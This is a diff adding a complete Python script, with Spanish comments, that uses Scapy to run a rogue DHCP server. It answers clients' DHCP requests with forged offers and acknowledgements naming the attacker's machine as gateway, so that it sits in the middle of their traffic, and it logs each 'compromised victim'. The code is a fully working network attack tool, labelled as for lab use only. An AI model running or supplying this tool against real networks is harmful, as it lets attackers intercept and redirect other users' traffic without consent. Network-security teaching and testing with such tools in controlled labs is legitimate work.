@@ -1,0 +1,160 @@
+#!/usr/bin/env python3
+"""
+=======================================================================
+  DHCP ROGUE SERVER — Laboratorio de Seguridad en Redes
+  Herramienta: Scapy
+  Descripcion: Levanta un servidor DHCP falso que responde antes que
+               el servidor legitimo, asignando una puerta de enlace
+               controlada por el atacante (Man-in-the-Middle L3).
+  USO EDUCATIVO / ENTORNO CONTROLADO UNICAMENTE
+=======================================================================
+"""
+
+import os, sys, argparse, time
+from scapy.all import (
+    Ether, IP, UDP, BOOTP, DHCP,
+    sniff, sendp, get_if_hwaddr
+)
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+BANNER = f"""
+{Fore.RED}╔══════════════════════════════════════════════════╗
+║       DHCP ROGUE SERVER — Scapy Lab Tool         ║
+║      Solo para entornos de prueba controlados    ║
+╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
+"""
+
+# ── Configuración global del servidor falso ─────────────────────────
+class ServidorFalso:
+    interfaz     = "eth0"
+    ip_servidor  = "11.63.10.50"   # IP del atacante en la red
+    ip_gateway   = "11.63.10.50"   # GW falso → redirige tráfico al atacante
+    ip_dns       = "8.8.8.8"
+    mascara      = "255.255.255.0"
+    lease_time   = 600             # segundos
+    _contador    = 50              # primer último octeto a asignar
+    _victimas: dict[str, str] = {}
+
+cfg = ServidorFalso()
+
+# ── Lógica de asignación de IPs ────────────────────────────────────
+def obtener_ip_para(mac: str) -> str:
+    if mac in cfg._victimas:
+        return cfg._victimas[mac]
+    base = ".".join(cfg.ip_servidor.split(".")[:3])
+    nueva_ip = f"{base}.{cfg._contador}"
+    cfg._contador += 1
+    cfg._victimas[mac] = nueva_ip
+    return nueva_ip
+
+# ── Construcción de paquetes ────────────────────────────────────────
+def _base_respuesta(pkt, tipo: str, ip_victima: str) -> Ether:
+    mac_atacante = get_if_hwaddr(cfg.interfaz)
+    return (
+        Ether(src=mac_atacante, dst=pkt[Ether].src)
+        / IP(src=cfg.ip_servidor, dst="255.255.255.255")
+        / UDP(sport=67, dport=68)
+        / BOOTP(
+            op=2,
+            yiaddr=ip_victima,
+            siaddr=cfg.ip_servidor,
+            chaddr=pkt[BOOTP].chaddr,
+            xid=pkt[BOOTP].xid,
+        )
+        / DHCP(options=[
+            ("message-type", tipo),
+            ("server_id",    cfg.ip_servidor),
+            ("lease_time",   cfg.lease_time),
+            ("subnet_mask",  cfg.mascara),
+            ("router",       cfg.ip_gateway),
+            ("name_server",  cfg.ip_dns),
+            "end",
+        ])
+    )
+
+def armar_offer(pkt, ip: str) -> Ether:
+    return _base_respuesta(pkt, "offer", ip)
+
+def armar_ack(pkt, ip: str) -> Ether:
+    return _base_respuesta(pkt, "ack", ip)
+
+# ── Procesador de paquetes capturados ──────────────────────────────
+def procesar_paquete(pkt) -> None:
+    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
+        return
+
+    tipo_msg = None
+    for opcion in pkt[DHCP].options:
+        if isinstance(opcion, tuple) and opcion[0] == "message-type":
+            tipo_msg = opcion[1]
+            break
+
+    if tipo_msg is None:
+        return
+
+    mac_victima = pkt[Ether].src
+
+    if tipo_msg == 1:  # DISCOVER
+        ip_asignada = obtener_ip_para(mac_victima)
+        print(f"\n{Fore.CYAN}[→] DISCOVER recibido  | MAC víctima: {mac_victima}")
+        print(f"{Fore.RED}[!] Ofreciendo IP falsa: {ip_asignada} | GW falso: {cfg.ip_gateway}")
+        sendp(armar_offer(pkt, ip_asignada), iface=cfg.interfaz, verbose=False)
+        print(f"{Fore.GREEN}[←] OFFER enviado → {ip_asignada}")
+
+    elif tipo_msg == 3:  # REQUEST
+        ip_asignada = obtener_ip_para(mac_victima)
+        print(f"\n{Fore.CYAN}[→] REQUEST recibido   | MAC víctima: {mac_victima}")
+        sendp(armar_ack(pkt, ip_asignada), iface=cfg.interfaz, verbose=False)
+        print(f"{Fore.GREEN}[←] ACK enviado → {ip_asignada}")
+        print(f"{Fore.RED}[✓] VÍCTIMA COMPROMETIDA:")
+        print(f"{Fore.RED}    MAC : {mac_victima}")
+        print(f"{Fore.RED}    IP  : {ip_asignada}")
+        print(f"{Fore.RED}    GW  : {cfg.ip_gateway}  ← ATACANTE")
+        print(f"{Fore.RED}    DNS : {cfg.ip_dns}")
+
+# ── Main ─────────────────────────────────────────────────────────────
+def main():
+    if os.geteuid() != 0:
+        print(f"{Fore.RED}[!] Este script requiere privilegios root (sudo).")
+        sys.exit(1)
+
+    parser = argparse.ArgumentParser(
+        description="DHCP Rogue Server — Herramienta educativa con Scapy"
+    )
+    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej. eth0)")
+    parser.add_argument("--server-ip", default="11.63.10.50", help="IP del atacante/servidor falso")
+    parser.add_argument("--gateway-ip", default="11.63.10.50", help="Gateway falso a anunciar")
+    parser.add_argument("--dns-ip",     default="8.8.8.8",      help="DNS a anunciar")
+    args = parser.parse_args()
+
+    cfg.interfaz    = args.interface
+    cfg.ip_servidor = args.server_ip
+    cfg.ip_gateway  = args.gateway_ip
+    cfg.ip_dns      = args.dns_ip
+
+    print(BANNER)
+    print(f"{Fore.YELLOW}[*] Interfaz     : {cfg.interfaz}")
+    print(f"{Fore.YELLOW}[*] IP Servidor  : {cfg.ip_servidor}")
+    print(f"{Fore.RED}[!] GW Falso     : {cfg.ip_gateway}")
+    print(f"{Fore.RED}[!] DNS Anunciado: {cfg.ip_dns}")
+    print(f"{Fore.CYAN}[*] Escuchando peticiones DHCP... CTRL+C para detener\n")
+
+    try:
+        sniff(
+            iface=cfg.interfaz,
+            filter="udp and (port 67 or port 68)",
+            prn=procesar_paquete,
+            store=False,
+        )
+    except KeyboardInterrupt:
+        pass
+
+    print(f"\n{Fore.CYAN}[*] Sesión finalizada.")
+    print(f"{Fore.CYAN}[*] Total víctimas comprometidas: {len(cfg._victimas)}")
+    for mac, ip in cfg._victimas.items():
+        print(f"{Fore.RED}    {mac}  →  {ip}  (GW: {cfg.ip_gateway})")
+
+if __name__ == "__main__":
+    main()
